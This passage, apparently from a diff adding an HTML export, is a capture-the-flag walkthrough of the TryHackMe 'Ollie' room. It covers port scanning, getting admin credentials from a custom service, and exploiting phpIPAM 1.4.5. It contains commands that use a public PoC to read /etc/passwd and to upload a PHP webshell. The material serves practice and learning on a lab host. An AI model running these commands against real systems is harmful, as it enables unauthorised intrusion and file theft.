@@ -1,0 +1,763 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>TryHackMe - Ollie  Room Walkthrough</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2a57a944-c6ef-80ba-b4a5-f28fa1487e9c" class="page sans"><header><h1 class="page-title">TryHackMe - Ollie  Room Walkthrough</h1><p class="page-description"></p></header><div class="page-body"><p id="2a57a944-c6ef-80fa-816a-d6b94c668ae3" class="">
+</p><p id="2a57a944-c6ef-80d9-b1ee-fa96faacb7d3" class=""><strong>Description</strong>:</p><p id="2a57a944-c6ef-80f6-b630-dd1c8f798cad" class="">Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!</p><p id="2a57a944-c6ef-80e1-9744-fc305b433e03" class="">
+</p><p id="2a57a944-c6ef-80cf-934d-f73d870c5b96" class="">
+</p><h2 id="2a57a944-c6ef-8038-80b5-ef851a23059c" class="">Recon and Enumeration</h2><p id="2a57a944-c6ef-804e-af11-c8a70c425ee1" class="">
+</p><h3 id="2a57a944-c6ef-80e7-a87d-cba6a227dde6" class="">I started with RustScan and Nmap:</h3><p id="2a57a944-c6ef-80ad-a81f-c502cb4e764c" class=""><strong>RustScan</strong>: Modern fast port scanner - to quickly find open ports</p><p id="2a57a944-c6ef-80b0-b43c-fb2180c216e9" class=""><strong>Nmap</strong>: A powerful network mapper - open ports, services running, OS detection …</p><p id="2a57a944-c6ef-802e-943c-e6729aeea470" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-80a4-b62e-f7e00456cb62" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">rustscan -r 1-65535 -a 10.10.126.209 -- -sV -sC -T4 -o scan-results.txt
+</code></pre><p id="2a57a944-c6ef-80ff-85a5-fb3f06799e58" class="">The scan results shows us with three ports open</p><p id="2a57a944-c6ef-8060-872b-ea7a932d05be" class="">22 - SSH</p><p id="2a57a944-c6ef-807f-8962-c8fdf45a92f9" class="">80 - http - apache httpd 2.4.41</p><p id="2a57a944-c6ef-80fc-96cc-de3940a81ff3" class="">1337 - A custom tcp service</p><p id="2a57a944-c6ef-807d-b0b8-effeacaff462" class="">
+</p><figure id="2a57a944-c6ef-8008-a836-dfef5cc09ab0" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image.png"><img style="width:912px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image.png"/></a></figure><p id="2a57a944-c6ef-80ef-8d04-cbfe5535a044" class="">
+</p><p id="2a57a944-c6ef-8091-a2a7-dc55f77d665b" class="">I navigated to port 80, there is  login page or administration panel. I tried some SQLi with no luck. After that I tried connect to port 1337(leet) custom service using netcat(The Swiss Army Knife of networking).</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-8098-9980-ebd0727ac1f2" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">nc ollie.thm 1337</code></pre><p id="2a57a944-c6ef-807c-9bc9-e2070879f758" class="">
+</p><p id="2a57a944-c6ef-8012-8e94-f896989a07cb" class="">For first-time users, ollie.thm resolves to the target machine’s IP address.</p><p id="2a57a944-c6ef-8055-8e36-f42a33964418" class="">Add the following line to your hosts file so you can use ollie.thm </p><p id="2a57a944-c6ef-808b-b3f5-f9828f67fd1d" class="">instead of remembering the numeric IP.</p><p id="2a57a944-c6ef-805e-b1e7-f3a381e34fda" class="">
+</p><p id="2a57a944-c6ef-80a5-a26f-f18bcb4e787b" class="">Linux (<code>/etc/hosts</code>):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-80f9-8645-e923b5f086ef" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">&lt;machine-ip&gt; ollie.thm
+# example
+10.10.10.5 ollie.thm</code></pre><p id="2a57a944-c6ef-8033-9f74-f7311b14fb5e" class="">Windows (<code>C:\Windows\System32\drivers\etc\hosts</code>) — edit as Administrator:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-8094-9f91-e14a50bc34e7" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">&lt;machine-ip&gt; ollie.thm
+# example
+10.10.10.5 ollie.thm</code></pre><p id="2a57a944-c6ef-8010-8fc7-d53e6cc8a173" class="">Once added, <code>ollie.thm</code> will consistently resolve to the machine’s IP.</p><p id="2a57a944-c6ef-80cf-8671-e2328abf4c45" class="">
+</p><p id="2a57a944-c6ef-8052-bbd5-c76709810d3a" class=""> It asked me some questions then returned  credentials for the administration panel</p><p id="2a57a944-c6ef-8004-8715-cfa33dbcb1b2" class="">
+</p><figure id="2a57a944-c6ef-80e7-b0fc-e1d68d5a8ad3" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%201.png"><img style="width:960px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%201.png"/></a></figure><p id="2a57a944-c6ef-80fa-98e0-d284c0fead40" class="">Used the credentials we found and logged into the web service at port 80. It’s running an older version of phpIPAM.</p><p id="2a57a944-c6ef-8083-80f0-d295cb94e0a7" class=""><strong>phpIPAM</strong> is an <strong>open-source IP address management (IPAM)</strong> system written in PHP, using a MySQL/MariaDB database. It helps network administrators <strong>plan, track, and manage IP address spaces</strong> efficiently. For example, a network admin can use phpIPAM to manage all subnets in a data center, track device allocations, and integrate with DHCP to prevent IP conflicts.</p><p id="2a57a944-c6ef-809f-82f4-d81fcb11a2f9" class="">
+</p><p id="2a57a944-c6ef-8068-ae47-d67ad2cbae8f" class="">It’s running <strong>phpIPAM version 1.4.5 which has a known authenticated Remote Code Execution (RCE)</strong></p><p id="2a57a944-c6ef-8011-9ba6-e512139fa124" class="">
+</p><p id="2a57a944-c6ef-8011-8260-d480802fa9c5" class="">The PoC can be found here - <a href="https://github.com/hadrian3689/phpipam_1.4.4">https://github.com/hadrian3689/phpipam_1.4.4</a></p><p id="2a57a944-c6ef-8095-af00-cab5e00ad0d7" class="">
+</p><p id="2a57a944-c6ef-809f-a93a-dad7445c1111" class=""><strong>Using the PoC we can read files from the server and Upload malicious files</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-8066-8901-e184512e4ecc" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">python3 poc.pyp -t http://ollie.thm -u admin -p [redacted] -f /etc/passwd</code></pre><figure id="2a57a944-c6ef-80bb-acb6-fe4f534c31bc" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%202.png"><img style="width:768px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%202.png"/></a></figure><p id="2a57a944-c6ef-80ae-a0d9-d34cacbe74fd" class="">
+</p><p id="2a57a944-c6ef-8092-8f5e-cd418b6be2cb" class="">We can also upload a file using -w flag. The following command uploads a php webshell to the servers /var/www/html/ directory - which is where the website files exist. we can it at http://ollie.thm/cmd.php</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a57a944-c6ef-8038-ab99-fc43e82b509f" class="code code-wrap"><code class="language-CoffeeScript" style="white-space:pre-wrap;word-break:break-all">python3 poc.py -t http://ollie.thm -u admin -p password -w /var/www/html/cmd.php</code></pre><figure id="2a57a944-c6ef-801b-82ea-f0f48516a373" class="image"><a href="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%203.png"><img style="width:709.9666748046875px" src="TryHackMe%20-%20Ollie%20Room%20Walkthrough/image%203.png"/></a></figure><p id="2a57a944-c6ef-80ee-8145-e563bab27fa9" class="">The php file cmd.php is a php webshell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" 